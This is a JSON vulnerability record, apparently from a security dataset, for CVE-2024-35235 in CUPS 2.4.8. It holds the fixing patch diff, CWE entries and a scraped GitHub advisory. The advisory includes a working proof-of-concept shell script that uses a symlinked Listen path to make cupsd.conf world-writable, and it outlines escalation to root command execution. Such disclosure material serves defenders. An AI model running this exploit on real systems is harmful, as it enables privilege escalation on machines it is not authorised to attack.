{
    "published_date": "2024-06-11T14:13:23.771Z",
    "patch_commits": [
        {
            "url": "https://github.com/OpenPrinting/cups/commit/ff1f8a623e090dee8a8aadf12a6a4b25efac143d",
            "content": "Merge pull request from GHSA-vvwp-mv6j-hw6f\n\nFix domain socket handling\n\nFilename: cups/http-addr.c:\n```\n@@ -226,18 +226,29 @@\nhttpAddrListen(http_addr_t *addr,\t// I - Address to bind to\n     mode_t\tmask;\t\t\t// Umask setting\n \n     // Remove any existing domain socket file...\n-    unlink(addr->un.sun_path);\n+    if ((status = unlink(addr->un.sun_path)) < 0)\n+    {\n+      DEBUG_printf(\"1httpAddrListen: Unable to unlink \\\"%s\\\": %s\", addr->un.sun_path, strerror(errno));\n \n-    // Save the current umask and set it to 0 so that all users can access\n-    // the domain socket...\n-    mask = umask(0);\n+      if (errno == ENOENT)\n+\tstatus = 0;\n+    }\n \n-    // Bind the domain socket...\n-    status = bind(fd, (struct sockaddr *)addr, (socklen_t)httpAddrLength(addr));\n+    if (!status)\n+    {\n+      // Save the current umask and set it to 0 so that all users can access\n+      // the domain socket...\n+      mask = umask(0);\n \n-    // Restore the umask and fix permissions...\n-    umask(mask);\n-    chmod(addr->un.sun_path, 0140777);\n+      // Bind the domain socket...\n+      if ((status = bind(fd, (struct sockaddr *)addr, (socklen_t)httpAddrLength(addr))) < 0)\n+      {\n+\tDEBUG_printf(\"1httpAddrListen: Unable to bind domain socket \\\"%s\\\": %s\", addr->un.sun_path, strerror(errno));\n+      }\n+\n+      // Restore the umask...\n+      umask(mask);\n+    }\n   }\n   else\n #endif // AF_LOCAL\n```\n\nFilename: scheduler/conf.c:\n```\n@@ -3152,6 +3152,26 @@\nread_cupsd_conf(cups_file_t *fp)\t/* I - File to read from */\n       cupsd_listener_t\t*lis;\t\t/* New listeners array */\n \n \n+     /*\n+      * If we are launched on-demand, do not use domain sockets from the config\n+      * file.  Also check that the domain socket path is not too long...\n+      */\n+\n+#ifdef HAVE_ONDEMAND\n+      if (*value == '/' && OnDemand)\n+      {\n+        if (strcmp(value, CUPS_DEFAULT_DOMAINSOCKET))\n+          cupsdLogMessage(CUPSD_LOG_INFO, \"Ignoring %s address %s at line %d - only using domain socket from launchd/systemd.\", line, value, linenum);\n+        continue;\n+      }\n+#endif // HAVE_ONDEMAND\n+\n+      if (*value == '/' && strlen(value) > (sizeof(addr->addr.un.sun_path) - 1))\n+      {\n+        cupsdLogMessage(CUPSD_LOG_INFO, \"Ignoring %s address %s at line %d - too long.\", line, value, linenum);\n+        continue;\n+      }\n+\n      /*\n       * Get the address list...\n       */\n```"
        }
    ],
    "sw_version": "v2.4.8",
    "sw_version_wget": "https://github.com/OpenPrinting/cups/archive/refs/tags/v2.4.8.zip",
    "description": "OpenPrinting CUPS is an open source printing system for Linux and other Unix-like operating systems. In versions 2.4.8 and earlier, when starting the cupsd server with a Listen configuration item pointing to a symbolic link, the cupsd process can be caused to perform an arbitrary chmod of the provided argument, providing world-writable access to the target. Given that cupsd is often running as root, this can result in the change of permission of any user or system files to be world writable. Given the aforementioned Ubuntu AppArmor context, on such systems this vulnerability is limited to those files modifiable by the cupsd process. In that specific case it was found to be possible to turn the configuration of the Listen argument into full control over the cupsd.conf and cups-files.conf configuration files. By later setting the User and Group arguments in cups-files.conf, and printing with a printer configured by PPD with a `FoomaticRIPCommandLine` argument, arbitrary user and group (not root) command execution could be achieved, which can further be used on Ubuntu systems to achieve full root command execution. Commit ff1f8a623e090dee8a8aadf12a6a4b25efac143d contains a patch for the issue.\n",
    "sec_adv": [
        {
            "url": "https://github.com/OpenPrinting/cups/security/advisories/GHSA-vvwp-mv6j-hw6f",
            "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nOpenPrinting\n/\ncups\nPublic\nNotifications You must be signed in to change notification settings\nFork 238\nStar 1.3k\nCode\nIssues\n12\nPull requests\n4\nDiscussions\nActions\nProjects\nWiki\nSecurity\n4\nInsights\nAdditional navigation options\nCupsd Listen arbitrary chmod 0140777\nModerate zdohnal published GHSA-vvwp-mv6j-hw6f on Jun 11, 2024Jun 11, 2024\nPackage\ncupsd\nAffected versions\n<=2.4.8\nPatched versions\nNone\nDescription\nSummary\nWhen starting the cupsd server with a Listen configuration item pointing to a symbolic link, the cupsd process can be caused to perform an arbitrary chmod of the provided argument, providing world-writable access to the target.\nDetails\nThis is an excerpt from a larger chain of vulnerabilities reported in Ubuntu 24.04. There is an assumption for exploitation that /etc/cups/cupsd.conf can be successfully edited (this has been omitted here as it is believed to be out of scope).\nWhen setting up the bind for unix sockets configured in the Listen parameters of the configuration file, the code does not check for a successful call to unlink and bind prior to performing the call to chmod. [1]\nOn Ubuntu 24.04, by setting the Listen argument to a path such as /tmp/stage/file, where file is a symlink elsewhere in the system, the previous call to unlink for the path will fail due to AppArmor [2], and the subsequent call to bind will also fail due to the file still existing. The return value of the call to bind is not checked before the call to chmod, so a successfully planted symbolic link which causes the bind to fail will still be traversed by the call to chmod and the file permissions changed to be world writable.\nOn systems where the Ubuntu AppArmor policy is not in place, this vulnerability still exists but as a race condition between the call to unlink and the call to bind. A sufficiently fast attacker could place a symbolic link at the configured location after the call to unlink, causing the bind to fail once again and performing a successful chmod.\nSuggested Fix\nRecursively open the configured paths using openat with O_NOFOLLOW, followed by using fchmod in place of chmod. This will ensure that there are no unexpected symbolic links in the path.\nCheck the return value of the bind call before performing the chmod to ensure that the file is a socket. This is not perfect but can drastically narrow the race condition window.\n[1]\ncups/cups/http-addr.c\nLines 229 to 240 in aba9170\n unlink(addr->un.sun_path); \n    // Save the current umask and set it to 0 so that all users can access \n // the domain socket... \n mask = umask(0); \n    // Bind the domain socket... \n status = bind(fd, (struct sockaddr *)addr, (socklen_t)httpAddrLength(addr)); \n    // Restore the umask and fix permissions... \n umask(mask); \n chmod(addr->un.sun_path, 0140777); \n\n[2] https://git.launchpad.net/ubuntu/+source/apparmor/tree/profiles/apparmor.d/abstractions/user-tmp#n21\nPoC\nThe following script can be used for exploitation, sudo is used to emulate the above mentioned Listen configuration access.\nset -e\nexploit() {\n        echo \"Staging...\"\n        mkdir -m 777 /tmp/stage\n        ln -s /etc/cups/cupsd.conf /tmp/stage/cupsd.conf\n\n        # emulate configuration access to cupsd.conf\n        echo 'Listen /tmp/stage/cupsd.conf' | sudo tee -a /etc/cups/cupsd.conf\n\n        echo\n\n        echo \"Current permissions of cupsd.conf\"\n        ls -l /etc/cups/cupsd.conf\n        tail -n1 /etc/cups/cupsd.conf || true\n\n        echo\n\n        echo \"Restarting cupsd\"\n        sudo systemctl restart cups\n\n        echo\n\n        echo \"New permissions of cupsd.conf\"\n        ls -l /etc/cups/cupsd.conf\n        tail -n1 /etc/cups/cupsd.conf || true\n}\n\ncleanup() {\n        sudo sed -i '/Listen \\/tmp\\/stage\\/cupsd.conf/d' /etc/cups/cupsd.conf\n        sudo chmod 640 /etc/cups/cupsd.conf\n        rm -rf /tmp/stage\n}\n\n$@\nSample output can be seen below:\n$ sh poc.sh exploit\nStaging...\nListen /tmp/stage/cupsd.conf\n\nCurrent permissions of cupsd.conf\n-rw-r----- 1 root lp 4987 May 24 10:18 /etc/cups/cupsd.conf\ntail: cannot open '/etc/cups/cupsd.conf' for reading: Permission denied\n\nRestarting cupsd\n\nNew permissions of cupsd.conf\n-rwxrwxrwx 1 root lp 4987 May 24 10:18 /etc/cups/cupsd.conf\nListen /tmp/stage/cupsd.conf\n$ sh poc.sh cleanup\nImpact\nGiven that cupsd is often running as root, this can result in the change of permission of any user or system files to be world writable.\nGiven the aforementioned Ubuntu AppArmor context, on such systems this vulnerability is limited to those files modifiable by the cupsd process. In that specific case it was found to be possible to turn the configuration of the Listen argument into full control over the cupsd.conf and cups-files.conf configuration files. By later setting the User and Group arguments in cups-files.conf, and printing with a printer configured by PPD with a FoomaticRIPCommandLine argument, arbitrary user and group (not root) command execution could be achieved, which can further be used on Ubuntu systems to achieve full root command execution.\nSeverity\nModerate\n4.4\n/ 10\nCVSS v3 base metrics\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N\nCVE ID\nCVE-2024-35235\nWeaknesses\nCWE-59 CWE-252\nCredits\nrmcnamara-snyk\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
            "effective": true,
            "effective_reason": "The advisory includes a script labeled as PoC (Proof of Concept) that outlines the exploitation steps."
        }
    ],
    "cwe": [
        {
            "id": "CWE-59",
            "value": "CWE-59: Improper Link Resolution Before File Access ('Link Following')"
        },
        {
            "id": "CWE-252",
            "value": "CWE-252: Unchecked Return Value"
        }
    ],
    "dir_tree": ".\n\u251c\u2500\u2500 backend\n\u251c\u2500\u2500 berkeley\n\u251c\u2500\u2500 cgi-bin\n\u251c\u2500\u2500 conf\n\u251c\u2500\u2500 config-scripts\n\u251c\u2500\u2500 cups\n\u251c\u2500\u2500 data\n\u251c\u2500\u2500 desktop\n\u251c\u2500\u2500 doc\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 da\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 de\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 es\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 fr\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 help\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 images\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ja\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pt_BR\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 ru\n\u251c\u2500\u2500 examples\n\u251c\u2500\u2500 filter\n\u251c\u2500\u2500 locale\n\u251c\u2500\u2500 man\n\u251c\u2500\u2500 monitor\n\u251c\u2500\u2500 notifier\n\u251c\u2500\u2500 packaging\n\u251c\u2500\u2500 ppdc\n\u251c\u2500\u2500 scheduler\n\u251c\u2500\u2500 systemv\n\u251c\u2500\u2500 templates\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 da\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 de\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 es\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 fr\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ja\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pt_BR\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 ru\n\u251c\u2500\u2500 test\n\u251c\u2500\u2500 tools\n\u251c\u2500\u2500 vcnet\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 regex\n\u2514\u2500\u2500 xcode\n    \u2514\u2500\u2500 CUPS.xcodeproj\n\n42 directories\n",
    "repo_path": "cups-2.4.8/"
}